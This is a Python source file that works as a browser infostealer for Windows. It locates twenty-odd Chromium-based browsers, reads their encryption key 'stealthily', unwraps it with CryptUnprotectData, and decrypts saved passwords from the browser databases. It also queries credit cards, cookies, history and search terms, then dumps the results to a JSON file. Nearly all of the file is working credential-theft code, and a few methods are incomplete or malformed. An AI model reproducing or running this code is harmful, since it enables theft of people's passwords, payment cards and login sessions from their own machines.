import base64
import json
import os
import shutil
import sqlite3
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import logging
from Utilities.DataSaver import DataSaverUtility

from Utilities.StealthReader import StealthyFileReader


logging.basicConfig(level=logging.WARNING)

class PasswordUtils:
    @staticmethod

    def get_master_key(self, path: str):

        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            return None
        

        reader = StealthyFileReader(local_state_path)
        local_state_content = reader.read_text()

        
        if 'os_crypt' not in local_state_content:
            return None
        
        local_state = json.loads(local_state_content)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        return key

    def get_data(self, browser, path, profile, key, type_of_data, query_name):
        db_file = os.path.join(path, profile + type_of_data["file"])
        if not os.path.exists(db_file):
            logging.warning(f"DB file {db_file} does not exist.")
            return []

        # Use StealthyFileReader to copy the db content stealthily
        reader = StealthyFileReader(db_file)
        db_content = reader.read()
        with open('Vault.db', 'wb') as tmp_file:
            tmp_file.write(db_content)


    @staticmethod
    def decrypt_password(encrypted_password: bytes, key: bytes) -> str:
        initialization_vector = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, initialization_vector)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    
class BrowserPasswordRecovery:
    appData = os.getenv('LOCALAPPDATA')
    Browsers = {
        'amigo': os.path.join(appData, 'Amigo', 'User Data'),
        'torch': os.path.join(appData, 'Torch', 'User Data'),
        'kometa': os.path.join(appData, 'Kometa', 'User Data'),
        'orbitum': os.path.join(appData, 'Orbitum', 'User Data'),
        'cent-browser': os.path.join(appData, 'CentBrowser', 'User Data'),
        '7star': os.path.join(appData, '7Star', '7Star', 'User Data'),
        'sputnik': os.path.join(appData, 'Sputnik', 'Sputnik', 'User Data'),
        'vivaldi': os.path.join(appData, 'Vivaldi', 'User Data'),
        'google-chrome-sxs': os.path.join(appData, 'Google', 'Chrome SxS', 'User Data'),
        'google-chrome': os.path.join(appData, 'Google', 'Chrome', 'User Data'),
        'epic-privacy-browser': os.path.join(appData, 'Epic Privacy Browser', 'User Data'),
        'microsoft-edge': os.path.join(appData, 'Microsoft', 'Edge', 'User Data'),
        'uran': os.path.join(appData, 'uCozMedia', 'Uran', 'User Data'),
        'yandex': os.path.join(appData, 'Yandex', 'YandexBrowser', 'User Data'),
        'brave': os.path.join(appData, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'iridium': os.path.join(appData, 'Iridium', 'User Data'),
        'opera': os.path.join(appData, 'Opera Software', 'Opera Stable', 'User Data'),
        'chromium': os.path.join(appData, 'Chromium', 'User Data'), 
        'falkon': os.path.join(appData, 'Falkon', 'User Data'), 
        'sleipnir': os.path.join(appData, 'Fenrir Inc', 'Sleipnir', 'setting', 'modules', 'ChromiumViewer'),
        'blisk': os.path.join(appData, 'Blisk', 'User Data'),
        'coccoc': os.path.join(appData, 'CocCoc', 'Browser', 'User Data')
    }

    Queries = {
        'login_data': {
            'query': 'SELECT action_url, username_value, password_value FROM logins',
            'file': '\\Login Data',
            'columns': ['Website URL', 'Username', 'Password'],
            'decrypt': True
        },
        'credit_cards': {
            'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
            'file': '\\Web Data',
            'columns': ['Card Holder Name', 'Expiration Month', 'Expiration Year', 'Card Number', 'Last Modified'],
            'decrypt': True
        },
        'cookies': {
            'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
            'file': '\\Network\\Cookies',
            'columns': ['Host Key', 'Cookie Name', 'Path', 'Encrypted Cookie', 'Expires On'],
            'decrypt': True
        },
        'history': {
            'query': 'SELECT url, title, last_visit_time FROM urls',
            'file': '\\History',
            'columns': ['Website URL', 'Page Title', 'Last Visited Time'],
            'decrypt': False
        },
        'downloads': {
            'query': 'SELECT tab_url, target_path FROM downloads',
            'file': '\\History',
            'columns': ['Downloaded URL', 'Local File Path'],
            'decrypt': False
        },
        'search_history': {
            'query': 'SELECT term, normalized_term FROM keyword_search_terms',
            'file': '\\History',
            'columns': ['Search Term', 'Normalized Term'],
            'decrypt': False
        }
    }

    def __init__(self):
        pass

    def get_data(self, browser, path, profile, key, type_of_data, query_name):
        db_file = os.path.join(path, profile + type_of_data["file"])
        if not os.path.exists(db_file):
            logging.warning(f"DB file {db_file} does not exist.")
            return []

        results = []
        temp_db = 'Vault.db'
        shutil.copy(db_file, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])

        for row in cursor.fetchall():
            row = list(row)
            if type_of_data['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes) and row[i]:
                        try:
                            row[i] = PasswordUtils.decrypt_password(row[i], key)
                        except Exception as e:
                            logging.error(f"Error decrypting password: {e}")
                            pass

            if query_name == "login_data" and row[type_of_data['columns'].index('Username')] and row[type_of_data['columns'].index('Password')]:
                entry = {
                    "Website URL": row[type_of_data['columns'].index('Website URL')],
                    "Username": row[type_of_data['columns'].index('Username')],
                    "Password": row[type_of_data['columns'].index('Password')]
                }
                results.append(entry)

        conn.close()
        os.remove(temp_db)
        return results

    def installed_browsers(self):
        return [browser_name for browser_name, browser_path in self.Browsers.items() if os.path.exists(browser_path)]

    def all_profiles(self, browser_path):
        profiles = ['Default']
        profile_dir = os.path.join(browser_path)
        for entry in os.scandir(profile_dir):
            if entry.is_dir() and entry.name.startswith("Profile"):
                profiles.append(entry.name)
        return profiles

    def save_data(self, browser_name, profile, data_type, content):
        profile_dir = os.path.join(browser_name, profile)
        if content and not os.path.exists(profile_dir):
            os.makedirs(profile_dir)
        
        if content:
            file_path = os.path.join(profile_dir, f'{data_type}.txt')
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(content)

    def extract_all_browser_data(self):
        extracted_data = []  # List to store all the extracted data

        for browser in self.installed_browsers():
            browser_path = self.Browsers[browser]

            master_key = PasswordUtils.get_master_key(self, browser_path)

            if not master_key:
                continue
            
            profiles = self.all_profiles(browser_path)
            for profile in profiles:
                for query_name, query_item in self.Queries.items():
                    try:
                        # Ensure we pass all required parameters to the get_data method
                        data_entries = self.get_data(browser, browser_path, profile, master_key, query_item, query_name)
                        if data_entries:
                            # Each entry in data_entries will now be a dictionary, so we format it accordingly
                            for entry in data_entries:
                                data_format = {
                                    "Type": "Browser Passwords",
                                    "Browser": browser,
                                    "Profile": profile,
                                    "Data": entry
                                }
                                extracted_data.append(data_format)
                    except Exception as e:
                        logging.error(f"An error occurred while extracting '{query_name}' data from '{browser}' profile '{profile}': {e}")
            
            if os.path.exists("Vault.db"):
                os.remove("Vault.db")
        
        # Now we save the extracted data using the DataSaverUtility
        formatted_data = json.dumps(extracted_data, indent=4)
        DataSaverUtility.save_to_file(formatted_data)

